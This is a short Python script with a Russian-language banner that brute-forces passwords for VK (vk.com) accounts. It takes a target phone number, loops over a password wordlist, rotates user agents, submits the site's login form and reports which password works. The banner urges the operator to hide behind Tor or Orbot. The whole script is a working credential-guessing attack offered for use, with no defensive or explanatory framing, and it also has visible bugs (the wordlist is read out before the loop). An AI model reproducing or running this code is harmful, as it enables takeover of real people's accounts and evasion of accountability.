import lxml.html
import requests,random,time
banner ="""

   ╔═╦═╦╦╦╦╦═╦╦╦╗╔╦══╗
   ║╠║╩║╔╣═╣╣╣╔╣╚╝╠╗╔╝
   ╚═╩╩╩╝╚╩╩═╩╝╚══╝╚╝═

 В целях  вашей безопастности ,используйте tor или orbot.
"""
print(banner)

password =[]
login = input(" Телефон :")

url ="https://vk.com/"

print("[ Номер телефона| Работает | Пароль ]")
f=open("passwords","r")
f.read()
for passwor in f:
   password.append(passwor)
f.close
for passw in password:
   time.sleep(10)
   user_agents=['AndroidDownloadManager/6.0 (Linux; U; Android 6.0; DIG-L21HN Build/HUAWEIDIG-L21HN)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36']
   user_agent=random.choice(user_agents)
   headers = {
    'User-Agent': user_agent
}
   session = requests.session()
   data = session.get(url, headers=headers)
   page = lxml.html.fromstring(data.content)
   form = page.forms[0]
   form.fields['email'] = login
   form.fields['pass'] = passw
   response = session.post(form.action, data=form.form_values())
   check='onLoginDone' in response.text
   if check == True:
      print(f"[ {login} | Да | {passw} ]")
      break
   elif check ==False:
      print(f"[ {login} | Нет | {passw} ]")
